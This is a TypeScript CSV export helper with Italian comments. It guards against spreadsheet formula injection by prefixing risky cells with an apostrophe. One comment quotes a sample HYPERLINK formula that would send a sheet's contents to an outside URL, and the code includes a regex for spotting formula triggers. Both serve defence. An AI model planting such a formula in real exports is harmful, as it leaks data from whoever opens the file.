export type CsvColumn<TRow> = {
    header: string;
    value: (row: TRow) => string | number | boolean | Date | null | undefined;
};

// RFC 4180: un campo va tra virgolette solo se contiene il separatore, virgolette o un
// a-capo, e le virgolette al suo interno si raddoppiano. Tutto il resto esce così com'è.
const escapeCsvField = (raw: string): string => (/[",\r\n]/.test(raw) ? `"${raw.replace(/"/g, '""')}"` : raw);

/**
 * Excel e LibreOffice trattano come formula ogni cella che comincia con `=`, `+`, `-` o `@`
 * (e con tab o a-capo, che alcune versioni scartano prima di guardare il primo carattere), e
 * le virgolette RFC 4180 non lo impediscono: vengono tolte prima della valutazione. I testi
 * esportati li scrive chiunque abbia un account (note, nomi, descrizioni), mentre il file lo
 * apre di solito l'amministratore: una nota come `=HYPERLINK("https://…?d="&B2;"apri")`
 * spediva altrove il contenuto del foglio. Anche senza cattive intenzioni un telefono scritto
 * `+39 333 …` diventava una formula sbagliata al posto del numero.
 *
 * L'apostrofo davanti è la difesa raccomandata da OWASP: il foglio mostra il testo così
 * com'è, apostrofo compreso. Un numero scritto come testo (i prezzi `numeric` arrivano da
 * Postgres come stringhe, anche negativi) non è una formula e resta intatto, altrimenti
 * `-5.00` non sarebbe più sommabile.
 */
const formulaTriggerPattern = /^[=+\-@\t\r]/;
const plainNumberPattern = /^[+-]?\d+(?:\.\d+)?$/;

const neutralizeFormula = (text: string): string =>
    formulaTriggerPattern.test(text) && !plainNumberPattern.test(text) ? `'${text}` : text;

const toCsvText = (value: string | number | boolean | Date | null | undefined): string => {
    if (value == null) {
        return "";
    }

    if (value instanceof Date) {
        return value.toISOString();
    }

    if (typeof value === "boolean") {
        return value ? "Sì" : "No";
    }

    if (typeof value === "string") {
        return neutralizeFormula(value);
    }

    return String(value);
};

/**
 * Il BOM UTF-8 in testa: senza, Excel su Windows (il caso d'uso qui, un laboratorio con
 * dati in italiano) apre il file assumendo la codifica del sistema e mostra gli accenti
 * come sequenze illeggibili. `\r\n` per lo stesso motivo, è quello che Excel si aspetta.
 */
const byteOrderMark = String.fromCharCode(0xfeff);

export const toCsv = <TRow>(rows: TRow[], columns: CsvColumn<TRow>[]): string => {
    const lines = [
        columns.map((column) => escapeCsvField(column.header)),
        ...rows.map((row) => columns.map((column) => escapeCsvField(toCsvText(column.value(row))))),
    ];

    return `${byteOrderMark}${lines.map((line) => line.join(",")).join("\r\n")}\r\n`;
};
